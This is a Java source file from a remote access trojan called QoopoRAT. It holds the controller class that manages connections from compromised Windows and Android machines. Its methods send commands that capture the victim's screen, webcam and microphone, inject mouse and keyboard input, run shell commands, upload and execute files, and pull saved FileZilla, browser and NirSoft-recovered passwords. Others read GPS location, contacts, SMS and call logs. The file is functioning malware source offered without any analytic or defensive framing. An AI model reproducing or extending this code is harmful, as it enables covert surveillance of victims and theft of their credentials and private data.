/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooporat.android;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import qooporat.utilidades.Compresor;
import qooporat.utilidades.Protocolo;
import qooporat.utilidades.cifrado.Encriptacion;

/**
 *
 * @author Alberto
 */
public class Servidor extends Thread {

    private OutputStream salida;
    private InputStream entrada;
    private Socket conexion;
    private String identificador;
    private String pais;
    private String bandera;
    private String usuario;
    private String host;
    private String ipInterna;
    private String so;
    private String ip;
    private String webCam;
    private ObjectOutputStream enviarObjeto;
    private QoopoRAT cliente;
    private ObjectInputStream recibirObjeto;
    private boolean activo;
    private long ping;
    private long pong;
    private long tiempoVida;
    private String[] datos;
    private File dPrincipal;
    private File dDescargas;
    private File dImagenes;
    private File dWebCam;
    private File dEscritorio;
    private File dAudio;
//    private ImageIcon vistaPreviaEscritorio;
    private boolean android;
    private long bytesEnviados;
    private long bytesRecibidos;

    public Servidor(Socket socket, QoopoRAT cliente) {
        try {
            this.conexion = socket;
            this.entrada = this.conexion.getInputStream();
            this.salida = this.conexion.getOutputStream();
            this.recibirObjeto = new ObjectInputStream(this.entrada);
            this.enviarObjeto = new ObjectOutputStream(this.salida);
            this.cliente = cliente;
            activo = true;
            this.ip = socket.getRemoteSocketAddress().toString(); // tomo la ip externa con el puerto hasta q consigua al enviar la informacion
        } catch (IOException ex) {
        }
    }

    public void CierraConexion() {
        try {
            enviarObjeto.close();
            recibirObjeto.close();
            this.entrada.close();
            this.salida.close();
            this.conexion.close();
        } catch (IOException ex) {
        }
    }

    private void recibirThumbail(byte[] thumbail) {
        try {
            ByteArrayInputStream inn2 = new ByteArrayInputStream(thumbail);
//            BufferedImage m2 = ImageIO.read(inn2);
//            ImageIcon fot = new ImageIcon(m2);
//            QoopoRAT.administradoresArchivos.get(this.getIdentificador()).getVistaPrevia().setIcon(fot);
        } catch (Exception ex) {
            Logger.getLogger(Servidor.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public static String guardarIcono(byte[] datos, String nombre) {
        if (datos != null) {
            File file = new File(nombre);
            try {
                file.delete();
            } catch (Exception e) {
            }
            try {
                file.createNewFile();
                FileOutputStream fout = new FileOutputStream(file);
                fout.write(datos);
                fout.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return nombre;
    }

    private void recibirMiniatura(byte[] imagen) {
//        try {
//            cliente.ponerEstado("Recibi miniatura de (" + this.getInformacion() + ") " + QoopoRAT.convertirBytes(imagen.length));
//            ByteArrayInputStream inn = new ByteArrayInputStream(imagen);
//            BufferedImage m = ImageIO.read(inn);
//            try {
//                this.vistaPreviaEscritorio = new ImageIcon(m);
//            } catch (Exception e) {
//            }
//            try {
//                File ff = new File(dImagenes, "miniaturas");
//                if (!ff.exists()) {
//                    ff.mkdirs();
//                }
//                guardarIcono(imagen, new File(ff, "miniatura" + cliente.nombreHora()).getAbsolutePath());
//            } catch (Exception e) {
//            }
//            cliente.actualizarDatosServidor(this);
//        } catch (IOException ex) {
//            Logger.getLogger(Servidor.class.getName()).log(Level.SEVERE, null, ex);
//        }
    }

    private void autenticar() {
        cliente.autenticar(this);
    }

    @Override
    public void run() {
        try {
            while (activo) {
                int comando = recibirObjeto.readInt();
                switch (comando) {
                    case Protocolo.autenticar:
                        autenticar();
                        break;
                    case Protocolo.info:
                        String dat = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
                        datos = dat.split(":");
                        identificador = datos[1];
                        datos[2] = conexion.getInetAddress().getHostAddress();
//                        datos[2] = conexion.getRemoteSocketAddress().toString();
                        ip = datos[2];
                        try {
                            String[] m = datos[0].split("#");
                            pais = m[0];
                            bandera = m[1];
                        } catch (Exception e) {
                            pais = datos[0];
                            bandera = "3";
                        }
                        usuario = datos[4];
                        host = datos[5];
                        so = datos[7];
                        webCam = datos[6];
                        setAndroid(so.toLowerCase().contains("android"));
                        cliente.actualizarDatosServidor(this);
                        break;
                    case Protocolo.infoCompleta:
//                        String infoCompleta = (String) cliente.descomprimirObjeto((byte[]) recibirObjeto.readObject());
//                        Informacion infoVentana = (Informacion) QoopoRAT.informacion.get(this.getIdentificador());
//                        if (infoVentana != null) {
//                            infoVentana.txtInfo.setText(infoCompleta);
//                            infoVentana.repaint();
//                        }
                        break;
                    case Protocolo.pedirPortapapeles:
//                        String portapapeles = (String) cliente.descomprimirObjeto((byte[]) recibirObjeto.readObject());
//                        ClipBoard clipboard = (ClipBoard) QoopoRAT.portapapeles.get(this.getIdentificador());
//                        if (clipboard != null) {
//                            clipboard.contenido.setText(portapapeles);
//                            clipboard.repaint();
//                        }
                        break;
                    case Protocolo.comandoShell:
//                        String comandoRetorno = (String) cliente.descomprimirObjeto((byte[]) recibirObjeto.readObject());
//                        Consola consola = (Consola) QoopoRAT.consolas.get(this.getIdentificador());
//                        if (consola != null) {
//                            consola.salida.append(comandoRetorno);
//                            consola.salida.setCaretPosition(consola.salida.getDocument().getLength());
//                            consola.repaint();
//                        }
                        break;
                    case Protocolo.mensajeChat:
//                        String mensajeChat = (String) cliente.descomprimirObjeto((byte[]) recibirObjeto.readObject());
//                        Chat vChat = (Chat) QoopoRAT.ventanasChat.get(this.getIdentificador());
//                        if (vChat != null) {
//                            vChat.salida.append("Usuario:" + mensajeChat + "\n");
//                            vChat.salida.setCaretPosition(vChat.salida.getDocument().getLength());
//                            vChat.repaint();
//                        }
                        break;
                    case Protocolo.pantallaMiniatura:
                        byte[] miniatura = Compresor.descomprimirGZIP((byte[]) recibirObjeto.readObject());
                        this.recibirMiniatura(miniatura);
                        break;
                    case Protocolo.nowebCam:
//                        cliente.recibirNoWebCam(this);
                        break;
                    case Protocolo.listarDrives:
                        byte[] unidades = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirUnidades(unidades, this);
                        break;
                    case Protocolo.listarFormatosAudio:
                        byte[] formatos = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirFormatos(formatos, this);
                        break;
                    case Protocolo.listarWebCams:
                        byte[] listaWc = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirListaWebCams(listaWc, this);
                        break;
                    case Protocolo.listarMonitores:
                        byte[] listaMon = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirListaMonitores(listaMon, this);
                        break;
                    case Protocolo.listarProcesos:
                        byte[] procesos = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirListaProcesos(procesos, this);
                        break;
                    case Protocolo.listarConexiones:
                        byte[] conexiones = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirListaConexiones(conexiones, this);
                        break;
                    case Protocolo.listarDirectorio:
                        byte[] archivos = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirArchivos(archivos, this);
                        break;
                    case Protocolo.buscarArchivo:
                        byte[] archivo = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirArchivosBusqueda(archivo, this);
                        break;
                    case Protocolo.buscarDetener:
//                        AdminArchivos vent = (AdminArchivos) QoopoRAT.administradoresArchivos.get(this.getIdentificador());
//                        if (vent != null) {
//                            if (!vent.isVisible()) {
//                                vent.setVisible(true);
//                            }
//                            vent.detenerBusqueda();
//                            vent.repaint();
//                        }
                        break;
                    case Protocolo.thumbail:
                        byte[] thumbail = Compresor.descomprimirGZIP((byte[]) recibirObjeto.readObject());
                        this.recibirThumbail(thumbail);
                        break;
                    case Protocolo.fzPass:
//                        String passFZ = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
//                        Passwords passfz = (Passwords) QoopoRAT.passwords.get(this.getIdentificador());
//                        if (passfz != null) {
//                            passfz.passFZ.setText(passFZ);
//                            passfz.repaint();
//                        }
                        break;
                    case Protocolo.dmPass:
//                        String passDM = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
//                        Passwords passdm = (Passwords) QoopoRAT.passwords.get(this.getIdentificador());
//                        if (passdm != null) {
//                            passdm.passDM.setText(passDM);
//                            passdm.repaint();
//                        }
                        break;
                    case Protocolo.wpPass:
//                        String passWB = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
//                        Passwords passwb = (Passwords) QoopoRAT.passwords.get(this.getIdentificador());
//                        if (passwb != null) {
//                            passwb.passWB.setText(passWB);
//                            passwb.repaint();
//                        }
                        break;
                    case Protocolo.nirsoftPass:
//                        String passNirsoft = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
//                        Passwords passnirsoft = (Passwords) QoopoRAT.passwords.get(this.getIdentificador());
//                        if (passnirsoft != null) {
//                            passnirsoft.passNirsoft.setText(passNirsoft);
//                            passnirsoft.repaint();
//                        }
                        break;
                    case Protocolo.listarOffline:
//                        String listarOffline = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
//                        ArchivosOffline venOffline = (ArchivosOffline) QoopoRAT.ventanasOffline.get(this.getIdentificador());
//                        if (venOffline != null) {
//                            venOffline.txtListaOffline.setText(listarOffline);
//                            venOffline.repaint();
//                        }
                        break;
                    case Protocolo.mensajeServidor:
//                        String msg = Servidor.leerCadena((byte[]) recibirObjeto.readObject());
//                        System.out.println("MENSAJE DEL SERVIDOR (" + identificador + "):" + msg);
//                        cliente.ponerEstado("Servidor (" + identificador + "):" + msg);
                        break;
                    case Protocolo.pong:
                        pong = System.currentTimeMillis();
                        tiempoVida = pong - ping;
                        cliente.actualizarDatosServidor(this);
                        break;
                    case Protocolo.ubicacionGPS:
//                        try {
//                            GPSPosicion posicion = (GPSPosicion) cliente.descomprimirObjeto((byte[]) recibirObjeto.readObject());
//                            Mapa mapa = (Mapa) QoopoRAT.capturasGPS.get(this.getIdentificador());
//                            if (mapa != null) {
//                                mapa.getMapa().updateMap(posicion.getLongitud(), posicion.getLatitud(), posicion.getAltitud(), posicion.getVelocidad(), posicion.getAcurrancy(), posicion.getTime(), posicion.getProveedor());
//                                mapa.getMapa().repaint();
//                                mapa.repaint();
//                            }
//                        } catch (IOException | ClassNotFoundException e) {
//                        }
                        break;
                    case Protocolo.listarProveedoresGPS:
//                        List<String> provedores = (List<String>) cliente.descomprimirObjeto((byte[]) recibirObjeto.readObject());
//                        Mapa mapa = (Mapa) QoopoRAT.capturasGPS.get(this.getIdentificador());
//                        if (mapa != null) {
//                            try {
//                                mapa.getProvedor().removeAllItems();
//                            } catch (Exception e) {
//                            }
//                            for (String provedorGPS : provedores) {
//                                mapa.getProvedor().addItem(provedorGPS);
//                            }
//                            mapa.repaint();
//                        }
                        break;
                    case Protocolo.listarContactos:
                        byte[] contactos = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirContactos(contactos, this);
                        break;
                    case Protocolo.listarSMS:
                        byte[] mensajessms = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirSMS(mensajessms, this);
                        break;
                    case Protocolo.listarLlamadas:
                        byte[] llamadas = (byte[]) recibirObjeto.readObject();
//                        cliente.recibirLlamadas(llamadas, this);
                        break;
                }
            }
        } catch (IOException ex) {
            cliente.ponerEstado("Se desconecto el servidor  (" + this.getInformacion() + ")");
            this.quitarServidor();
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(Servidor.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void quitarServidor() {
        cliente.eliminarServidor(this);
    }

    public void hacerPing() {
        ping = System.currentTimeMillis();
        enviarComando(Protocolo.ping);
    }

    public void enviarComando(int i) {
        try {
            this.enviarObjeto.writeInt(i);
            this.enviarObjeto.flush();
        } catch (IOException ex) {
        }
    }

    public void enviarComando(int i, String cmd) {
        try {
            this.enviarComando(i);
            this.enviarObjeto(Encriptacion.cifra(cmd));
        } catch (Exception ex) {
            Logger.getLogger(Servidor.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void enviarComando(String cmd) {
        try {
            this.enviarObjeto(Encriptacion.cifra(cmd));
        } catch (Exception ex) {
            Logger.getLogger(Servidor.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void enviarObjeto(Object objeto) {
        try {
            this.enviarObjeto.writeObject(objeto);
            this.enviarObjeto.flush();
        } catch (IOException ex) {
            Logger.getLogger(Conexion.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void pedirPantalla(String formato, int tipo, int escala, int calidad, int ancho, int alto, int tipoEscalado, int monitor, int tipoColor, boolean mostrarCursor, int tipoEnvio) {
        this.enviarComando(Protocolo.capturaPantalla);
        this.enviarComando(formato + ":" + tipo + ":" + escala + ":" + calidad + ":" + ancho + ":" + alto + ":" + tipoEscalado + ":" + monitor + ":" + tipoColor + ":" + mostrarCursor + ":" + tipoEnvio);
    }

    /**
     *
     * @param x
     * @param y
     * @param boton 0 nigun boton , diferente de 0 valor del boton q presiono
     * @param accion 0 niguna , 1 Presionado , 2 Liberado , 3 Click
     * @param cantidadRueda
     * @param tipoRueda
     */
    public void enviarMouse(int x, int y, int boton, int accion, int cantidadRueda, int tipoRueda) {
        this.enviarComando(Protocolo.mouse);
        this.enviarComando(x + ":" + y + ":" + boton + ":" + accion + ":" + cantidadRueda + ":" + tipoRueda);
    }

    /**
     * @param keyCode
     * @param accion 1 Presionado , 2 Liberado , 3 Click
     */
    public void enviarTecla(int keyCode, int accion) {
        this.enviarComando(Protocolo.tecla);
        this.enviarComando(keyCode + ":" + accion);
    }

    public void pedirWebCam(String formato, int tipo, int calidad) {
        this.enviarComando(Protocolo.capturaWebCam);
        this.enviarComando(formato + ":" + tipo + ":" + calidad);
    }

    public void pedirMicAudio(String tipo) {
        this.enviarComando(Protocolo.capturaMicrofono);
        this.enviarComando(tipo);
    }

    public void cerrarWebCam() {
        this.enviarComando(Protocolo.cerrarWebCam);
    }

    public void seleccionarWebCam(String webCam) {
        this.enviarComando(Protocolo.abrirWebCam);
        this.enviarComando(webCam);
    }

    public void detenerMicrofono() {
        this.enviarComando(Protocolo.detenerMicrofono);
    }

    public void detenerPantalla() {
        this.enviarComando(Protocolo.detenerPantalla);
    }

    public void listarDrives() {
        this.enviarComando(Protocolo.listarDrives);
    }

    public void buscarArchivos(String criterio, String ruta) {
        this.enviarComando(Protocolo.buscarArchivo, criterio + "#" + ruta);
    }

    public void detenerBusqueda() {
        this.enviarComando(Protocolo.buscarDetener);
    }

    public void listarContactos() {
        this.enviarComando(Protocolo.listarContactos);
    }

    public void listarSMS() {
        this.enviarComando(Protocolo.listarSMS);
    }

    public void listarLlamadas() {
        this.enviarComando(Protocolo.listarLlamadas);
    }

    public void listarWebCams() {
        this.enviarComando(Protocolo.listarWebCams);
    }

    public void listarFormatosAudio() {
        this.enviarComando(Protocolo.listarFormatosAudio);
    }

    public void listarMonitores() {
        this.enviarComando(Protocolo.listarMonitores);
    }

    public void listarGPSProveedores() {
        this.enviarComando(Protocolo.listarProveedoresGPS);
    }

    public void listar(String ruta) {
        this.enviarComando(Protocolo.listarDirectorio);
        this.enviarComando(ruta);
    }

    public void descargar(String archivo) {
        this.enviarComando(Protocolo.descargar);
        this.enviarComando(archivo);
    }

    public void pedirFileZillaPass() {
        this.enviarComando(Protocolo.fzPass);
    }

    public void pedirDMPass() {
        this.enviarComando(Protocolo.dmPass);
    }

    public void pedirInfoCompleta() {
        this.enviarComando(Protocolo.infoCompleta);
    }

    public void pedirInfoSysInfo() {
        this.enviarComando(Protocolo.sysInfo);
    }

    public void listarConexiones() {
        this.enviarComando(Protocolo.listarConexiones);
    }

    public void listarProcesos() {
        this.enviarComando(Protocolo.listarProcesos);
    }

    public void matarProcesos(String pid) {
        this.enviarComando(Protocolo.matarProceso, pid);
    }

    public void ejecutarComandoConsola(String comando) {
        this.enviarComando(Protocolo.comandoShell, comando);
    }

    public void enviarMensajeChat(String mensaje) {
        this.enviarComando(Protocolo.mensajeChat);
        this.enviarObjeto(cliente.comprimirObjecto(mensaje));
    }

    public void pedirListaOffline() {
        this.enviarComando(Protocolo.listarOffline);
    }

    public void descargarListaOffline() {
        this.enviarComando(Protocolo.descargarOffline);
    }

    public void eliminarListaOffline() {
        this.enviarComando(Protocolo.eliminarOffline);
    }

    public void abrirChat() {
        this.enviarComando(Protocolo.abrirChat);
    }

    public void cerarChat() {
        this.enviarComando(Protocolo.cerrarChat);
    }

    public void activarComandoConsola() {
        this.enviarComando(Protocolo.activarConsola);
    }

    public void pedirPortapapeles() {
        this.enviarComando(Protocolo.pedirPortapapeles);
    }

    public void pedirWBPass() {
        this.enviarComando(Protocolo.wpPass);
    }

    public void pedirNirSoftPass() {
        this.enviarComando(Protocolo.nirsoftPass);
    }

    public void pedirPantallaMiniatura() {
        this.enviarComando(Protocolo.pantallaMiniatura);
    }

    public void ejecutar(String archivo) {
        this.enviarComando(Protocolo.ejecutar);
        this.enviarComando(archivo);
    }

    public void pedirThumbail(String archivo) {
        this.enviarComando(Protocolo.thumbail);
        this.enviarComando(archivo);
    }

    public void enviarPluginsWebCam() {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "RATPlugWebCam.jar");
        File p2 = new File(carpeta, "slf4j-api-1.7.2.jar");
        File p3 = new File(carpeta, "bridj-0.7-20130703.103049-42.jar");
        this.crearCarpeta("lib", "<server>");
        this.crearCarpeta("lib", "<server>/lib");
        this.subirArchivo(p1.getAbsolutePath(), "<server>/lib");
        this.subirArchivo(p2.getAbsolutePath(), "<server>/lib/lib");
        this.subirArchivo(p3.getAbsolutePath(), "<server>/lib/lib");
    }

    public void enviarPluginsNirSoft() {
//        File carpeta = new File("tmp");
//        try {
//            carpeta.mkdir();
//        } catch (Exception e) {
//        }
//        for (String plugin : QoopoRAT.nombresPluginsNirsoft) {
//            File p = new File(carpeta, plugin + ".exe");
//            this.subirArchivo(p.getAbsolutePath(), "<server>");
//        }
    }

    public void subirArchivo(String rutaArchivo, String rutaRemota) {
        this.enviarComando(Protocolo.subir);
        this.enviarComando(rutaArchivo);
        this.enviarComando(rutaRemota);
    }

    public void actualizarServidor(String rutaArchivo, String rutaRemota) {
        this.enviarComando(Protocolo.subirServidor);
        this.enviarComando(rutaArchivo);
        this.enviarComando(rutaRemota);
    }

    public void eliminar(String archivo) {
        this.enviarComando(Protocolo.eliminar);
        this.enviarComando(archivo);
    }

    public void crearCarpeta(String carpeta, String directorioActual) {
        this.enviarComando(Protocolo.crearCarpeta);
        this.enviarComando(carpeta);
        this.enviarComando(directorioActual);
    }

    /**
     * Reinicia al servidor
     */
    public void reiniciar() {
        this.enviarComando(Protocolo.reiniciar);
    }

    /**
     * Apaga el servidor
     */
    public void apagar() {
        this.enviarComando(Protocolo.apagarServidor);
    }

    public void activarGPS(String provedor) {
        this.enviarComando(Protocolo.activarGPS);
        this.enviarComando(provedor);
    }

    public void pedirGPS() {
        this.enviarComando(Protocolo.pedirGPS);
    }

    public void desactivarGPS() {
        this.enviarComando(Protocolo.desactivarGPS);
    }

    public void desinstalarServidor() {
        this.enviarComando(Protocolo.desinstalar);
    }
//    #######################################################

    public static String leerCadena(byte[] cadena) {
        try {
            return Encriptacion.descifra(cadena);
        } catch (Exception ex) {
            return new String(cadena);
        }
    }

    public String getIdentificador() {
        return identificador;
    }

    public void setIdentificador(String identificador) {
        this.identificador = identificador;
    }

    public Socket getConexion() {
        return conexion;
    }

    public void setConexion(Socket conexion) {
        this.conexion = conexion;
    }

    public String getInformacion() {
        try {
//            return this.getIdentificador() + " - " + this.getConexion().getInetAddress().getHostAddress();
            return this.getUsuario() + "@" + this.host;
        } catch (Exception e) {
            return "";
        }
    }

    public String getPais() {
        return pais;
    }

    public void setPais(String pais) {
        this.pais = pais;
    }

    public String getUsuario() {
        return usuario;
    }

    public void setUsuario(String usuario) {
        this.usuario = usuario;
    }

    public String getIp() {
        return ip;
    }

    public void setIp(String ip) {
        this.ip = ip;
    }

    public String getBandera() {
        return bandera;
    }

    public void setBandera(String bandera) {
        this.bandera = bandera;
    }

    public void DETENER() {
        activo = false;
        try {
            conexion.close();
        } catch (IOException ex) {
            Logger.getLogger(Servidor.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public long getTiempoVida() {
        return tiempoVida;
    }

    public void setTiempoVida(long tiempoVida) {
        this.tiempoVida = tiempoVida;
    }

    public String[] getDatos() {
        return datos;
    }

    public void setDatos(String[] datos) {
        this.datos = datos;
    }

    public File getdDescargas() {
        return dDescargas;
    }

    public void setdDescargas(File dDescargas) {
        this.dDescargas = dDescargas;
    }

    public File getdImagenes() {
        return dImagenes;
    }

    public void setdImagenes(File dImagenes) {
        this.dImagenes = dImagenes;
    }

    public File getdWebCam() {
        return dWebCam;
    }

    public void setdWebCam(File dWebCam) {
        this.dWebCam = dWebCam;
    }

    public File getdEscritorio() {
        return dEscritorio;
    }

    public void setdEscritorio(File dEscritorio) {
        this.dEscritorio = dEscritorio;
    }

    public File getdPrincipal() {
        return dPrincipal;
    }

    public void setdPrincipal(File dPrincipal) {
        this.dPrincipal = dPrincipal;
    }

    public File getdAudio() {
        return dAudio;
    }

    public void setdAudio(File dAudio) {
        this.dAudio = dAudio;
    }

//    public ImageIcon getVistaPreviaEscritorio() {
//        return vistaPreviaEscritorio;
//    }
//
//    public void setVistaPreviaEscritorio(ImageIcon vistaPreviaEscritorio) {
//        this.vistaPreviaEscritorio = vistaPreviaEscritorio;
//    }

    public String getHost() {
        return host;
    }

    public void setHost(String host) {
        this.host = host;
    }

    public String getIpInterna() {
        return ipInterna;
    }

    public void setIpInterna(String ipInterna) {
        this.ipInterna = ipInterna;
    }

    public String getSo() {
        return so;
    }

    public void setSo(String so) {
        this.so = so;
    }

    public boolean isAndroid() {
        return android;
    }

    public void setAndroid(boolean android) {
        this.android = android;
    }

    public String getWebCam() {
        return webCam;
    }

    public void setWebCam(String webCam) {
        this.webCam = webCam;
    }

    public long getBytesEnviados() {
        return bytesEnviados;
    }

    public void setBytesEnviados(long bytesEnviados) {
        this.bytesEnviados = bytesEnviados;
    }

    public long getBytesRecibidos() {
        return bytesRecibidos;
    }

    public void setBytesRecibidos(long bytesRecibidos) {
        this.bytesRecibidos = bytesRecibidos;
    }

    public void agregarEnviados(long enviados) {
        bytesEnviados += enviados;
    }

    public void agregarRecibidos(long recibidos) {
        bytesRecibidos += recibidos;
    }
}
